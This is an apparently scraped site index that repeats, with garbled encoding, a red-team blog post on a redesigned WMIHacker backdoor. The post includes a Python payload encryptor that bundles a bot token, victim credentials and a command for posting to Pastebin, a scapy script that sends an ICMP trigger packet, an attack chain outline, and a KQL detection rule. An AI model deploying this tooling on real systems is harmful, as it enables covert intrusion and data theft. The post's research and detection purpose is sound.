retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) Generate encrypted payload which will be placed in Pastebin.com\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) Send maliciously crafted ICMP ECHO request to host\n![]\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes lateral commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Assymetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Assymetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Assymetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token 